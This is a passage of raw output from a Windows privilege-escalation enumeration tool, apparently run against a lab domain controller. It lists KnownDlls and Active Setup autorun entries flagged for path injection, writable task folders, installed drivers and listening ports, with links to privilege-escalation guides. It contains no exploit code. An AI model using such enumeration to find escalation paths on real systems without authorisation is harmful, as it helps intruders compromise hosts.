    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                                                                

ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#vulnerable-drivers
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic FastLinQ Ethernet - 8.33.20.103 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware vSockets Service - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.705.08.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.4.225.8009 11/15/2017 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys                                                                                                                                                            
    QLogic iSCSI offload driver - 8.33.5.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys                                                                                                                                                 
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    QLogic FCoE offload driver - 8.33.4.2 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys
    QLogic iSCSI offload driver - 7.14.7.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    QLogic FCoE Offload driver - 7.14.15.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    VMware Pointing PS/2 Device Driver - 12.5.10.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 8.17.02.0014 - build-17592369 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 8.17.02.0014 - build-17592369 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.9.5.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys
    VMware server memory controller - 7.5.5.0 build-14903665 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
È The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:B9:9B:42]: 10.10.11.152, fe80::c52d:87a8:19e0:16c9%13, dead:beef::c52d:87a8:19e0:16c9, dead:beef::19a / 255.255.254.0
        Gateways: 10.10.10.2, fe80::250:56ff:feb9:6463%13
        DNSs: 127.0.0.1
        Known hosts:
          10.10.10.2            00-50-56-B9-64-63     Dynamic
          10.10.11.255          FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                             
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               88            0.0.0.0               0               Listening         660             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         920             svchost
  TCP        0.0.0.0               389           0.0.0.0               0               Listening         660             lsass
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               464           0.0.0.0               0               Listening         660             lsass
  TCP        0.0.0.0               593           0.0.0.0               0               Listening         920             svchost
  TCP        0.0.0.0               636           0.0.0.0               0               Listening         660             lsass
  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         660             lsass
  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         660             lsass
  TCP        0.0.0.0               5986          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         2724            Microsoft.ActiveDirectory.WebServices
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         520             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1128            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1588            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         660             lsass
  TCP        0.0.0.0               49673         0.0.0.0               0               Listening         660             lsass
  TCP        0.0.0.0               49674         0.0.0.0               0               Listening         660             lsass
  TCP        0.0.0.0               49689         0.0.0.0               0               Listening         640             services
  TCP        0.0.0.0               49692         0.0.0.0               0               Listening         2852            dns
  TCP        0.0.0.0               62205         0.0.0.0               0               Listening         2824            dfsrs
  TCP        10.10.11.152          53            0.0.0.0               0               Listening         2852            dns
  TCP        10.10.11.152          139           0.0.0.0               0               Listening         4               System
  TCP        10.10.11.152          5986          10.10.15.6            58860           Established       4               System
  TCP        10.10.11.152          51343         10.10.11.152          53              Time Wait         0               Idle
  TCP        127.0.0.1             53            0.0.0.0               0               Listening         2852            dns

  Enumerating IPv6 connections
                                                                                                                                                             
  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        88            [::]                                        0               Listening         660             lsass
  TCP        [::]                                        135           [::]                                        0               Listening         920             svchost
  TCP        [::]                                        389           [::]                                        0               Listening         660             lsass
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        464           [::]                                        0               Listening         660             lsass
  TCP        [::]                                        593           [::]                                        0               Listening         920             svchost
  TCP        [::]                                        636           [::]                                        0               Listening         660             lsass
  TCP        [::]                                        3268          [::]                                        0               Listening         660             lsass
  TCP        [::]                                        3269          [::]                                        0               Listening         660             lsass
  TCP        [::]                                        5986          [::]                                        0               Listening         4               System
  TCP        [::]                                        9389          [::]                                        0               Listening         2724            Microsoft.ActiveDirectory.WebServices
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         520             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         1128            svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         1588            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         660             lsass
  TCP        [::]                                        49673         [::]                                        0               Listening         660             lsass
  TCP        [::]                                        49674         [::]                                        0               Listening         660             lsass
  TCP        [::]                                        49689         [::]                                        0               Listening         640             services
  TCP        [::]                                        49692         [::]                                        0               Listening         2852            dns
  TCP        [::]                                        62205         [::]                                        0               Listening         2824            dfsrs
  TCP        [::1]                                       53            [::]                                        0               Listening         2852            dns
  TCP        [::1]                                       389           [::1]                                       49676           Established       660             lsass
  TCP        [::1]                                       389           [::1]                                       49677           Established       660             lsass
  TCP        [::1]                                       389           [::1]                                       49678           Established       660             lsass
  TCP        [::1]                                       389           [::1]                                       49690           Established       660             lsass
  TCP        [::1]                                       389           [::1]                                       49691           Established       660             lsass
  TCP        [::1]                                       389           [::1]                                       54844           Established       660             lsass
  TCP        [::1]                                       3268          [::1]                                       54846           Established       660             lsass
  TCP        [::1]                                       49676         [::1]                                       389             Established       2908            ismserv
  TCP        [::1]                                       49677         [::1]                                       389             Established       2908            ismserv
  TCP        [::1]                                       49678         [::1]                                       389             Established       2724            Microsoft.ActiveDirectory.WebServices
  TCP        [::1]                                       49690         [::1]                                       389             Established       2852            dns
  TCP        [::1]                                       49691         [::1]                                       389             Established       2852            dns
  TCP        [::1]                                       54844         [::1]                                       389             Established       2724            Microsoft.ActiveDirectory.WebServices
  TCP        [::1]                                       54846         [::1]                                       3268            Established       2724            Microsoft.ActiveDirectory.WebServices
  TCP        [dead:beef::19a]                            53            [::]                                        0               Listening         2852            dns
  TCP        [dead:beef::c52d:87a8:19e0:16c9]            53            [::]                                        0               Listening         2852            dns
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              53            [::]                                        0               Listening         2852            dns
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              135           [fe80::c52d:87a8:19e0:16c9%13]              62218           Established       920             svchost
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              389           [fe80::c52d:87a8:19e0:16c9%13]              62200           Established       660             lsass
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              389           [fe80::c52d:87a8:19e0:16c9%13]              62203           Established       660             lsass
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              49673         [fe80::c52d:87a8:19e0:16c9%13]              62212           Established       660             lsass
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              49673         [fe80::c52d:87a8:19e0:16c9%13]              62219           Established       660             lsass
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              49673         [fe80::c52d:87a8:19e0:16c9%13]              62224           Established       660             lsass
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              62200         [fe80::c52d:87a8:19e0:16c9%13]              389             Established       2824            dfsrs
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              62201         [fe80::c52d:87a8:19e0:16c9%13]              135             Time Wait         0               Idle
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              62202         [fe80::c52d:87a8:19e0:16c9%13]              49673           Time Wait         0               Idle
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              62203         [fe80::c52d:87a8:19e0:16c9%13]              389             Established       2824            dfsrs
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              62212         [fe80::c52d:87a8:19e0:16c9%13]              49673           Established       2824            dfsrs
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              62218         [fe80::c52d:87a8:19e0:16c9%13]              135             Established       1340            svchost
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              62219         [fe80::c52d:87a8:19e0:16c9%13]              49673           Established       1340            svchost
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              62223         [fe80::c52d:87a8:19e0:16c9%13]              135             Time Wait         0               Idle
  TCP        [fe80::c52d:87a8:19e0:16c9%13]              62224         [fe80::c52d:87a8:19e0:16c9%13]              49673           Established       660             lsass

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                             
  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            792               svchost
  UDP        0.0.0.0               389           *:*                            660               lsass
  UDP        0.0.0.0               500           *:*                            2868              svchost
  UDP        0.0.0.0               4500          *:*                            2868              svchost
  UDP        0.0.0.0               5353          *:*                            1188              svchost
  UDP        0.0.0.0               5355          *:*                            1188              svchost
  UDP        0.0.0.0               50644         *:*                            2852              dns
  UDP        0.0.0.0               50645         *:*                            2852              dns
  UDP        0.0.0.0               50646         *:*                            2852              dns
  UDP        0.0.0.0               50647         *:*                            2852              dns
  UDP        0.0.0.0               50648         *:*                            2852              dns
  UDP        0.0.0.0               50649         *:*                            2852              dns
  UDP        0.0.0.0               50650         *:*                            2852              dns
  UDP        0.0.0.0               50651         *:*                            2852              dns
  UDP        0.0.0.0               50652         *:*                            2852              dns
  UDP        0.0.0.0               50653         *:*                            2852              dns
  UDP        0.0.0.0               50654         *:*                            2852              dns
  UDP        0.0.0.0               50655         *:*                            2852              dns
  UDP        0.0.0.0               50656         *:*                            2852              dns
  UDP        0.0.0.0               50657         *:*                            2852              dns
  UDP        0.0.0.0               50658         *:*                            2852              dns
  UDP        0.0.0.0               50659         *:*                            2852              dns
  UDP        0.0.0.0               50660         *:*                            2852              dns
  UDP        0.0.0.0               50661         *:*                            2852              dns
  UDP        0.0.0.0               50662         *:*                            2852              dns
  UDP        0.0.0.0               50663         *:*                            2852              dns
  UDP        0.0.0.0               50664         *:*                            2852              dns
  UDP        0.0.0.0               50665         *:*                            2852              dns
  UDP        0.0.0.0               50666         *:*                            2852              dns
  UDP        0.0.0.0               50667         *:*                            2852              dns
  UDP        0.0.0.0               50668         *:*                            2852              dns
  UDP        0.0.0.0               50669         *:*                            2852              dns
  UDP        0.0.0.0               50670         *:*                            2852              dns
  UDP        0.0.0.0               50671         *:*                            2852              dns
  UDP        0.0.0.0               50672         *:*                            2852              dns
  UDP        0.0.0.0               50673         *:*                            2852              dns
  UDP        0.0.0.0               50674         *:*                            2852              dns
  UDP        0.0.0.0               50675         *:*                            2852              dns
  UDP        0.0.0.0               50676         *:*                            2852              dns
  UDP        0.0.0.0               50677         *:*                            2852              dns
  UDP        0.0.0.0               50678         *:*                            2852              dns
  UDP        0.0.0.0               50679         *:*                            2852              dns
  UDP        0.0.0.0               50680         *:*                            2852              dns
  UDP        0.0.0.0               50681         *:*                            2852              dns
  UDP        0.0.0.0               50682         *:*                            2852              dns
  UDP        0.0.0.0               50683         *:*                            2852              dns
  UDP        0.0.0.0               50684         *:*                            2852              dns
  UDP        0.0.0.0               50685         *:*                            2852              dns
  UDP        0.0.0.0               50686         *:*                            2852              dns
  UDP        0.0.0.0               50687         *:*                            2852              dns
  UDP        0.0.0.0               50688         *:*                            2852              dns
  UDP        0.0.0.0               50689         *:*                            2852              dns
  UDP        0.0.0.0               50690         *:*                            2852              dns
  UDP        0.0.0.0               50691         *:*                            2852              dns
  UDP        0.0.0.0               50692         *:*                            2852              dns
  UDP        0.0.0.0               50693         *:*                            2852              dns
  UDP        0.0.0.0               50694         *:*                            2852              dns
  UDP        0.0.0.0               50695         *:*                            2852              dns
  UDP        0.0.0.0               50696         *:*                            2852              dns
  UDP        0.0.0.0               50697         *:*                            2852              dns
  UDP        0.0.0.0               50698         *:*                            2852              dns
  UDP        0.0.0.0               50699         *:*                            2852              dns
  UDP        0.0.0.0               50700         *:*                            2852              dns
  UDP        0.0.0.0               50701         *:*                            2852              dns
  UDP        0.0.0.0               50702         *:*                            2852              dns
  UDP        0.0.0.0               50703         *:*                            2852              dns
  UDP        0.0.0.0               50704         *:*                            2852              dns
  UDP        0.0.0.0               50705         *:*                            2852              dns
  UDP        0.0.0.0               50706         *:*                            2852              dns
  UDP        0.0.0.0               50707         *:*                            2852              dns
  UDP        0.0.0.0               50708         *:*                            2852              dns
  UDP        0.0.0.0               50709         *:*                            2852              dns
  UDP        0.0.0.0               50710         *:*                            2852              dns
  UDP        0.0.0.0               50711         *:*                            2852              dns
  UDP        0.0.0.0               50712         *:*                            2852              dns
  UDP        0.0.0.0               50713         *:*                            2852              dns
  UDP        0.0.0.0               50714         *:*                            2852              dns
  UDP        0.0.0.0               50715         *:*                            2852              dns
  UDP        0.0.0.0               50716         *:*                            2852              dns
  UDP        0.0.0.0               50717         *:*                            2852              dns
  UDP        0.0.0.0               50718         *:*                            2852              dns
  UDP        0.0.0.0               50719         *:*                            2852              dns
  UDP        0.0.0.0               50720         *:*                            2852              dns
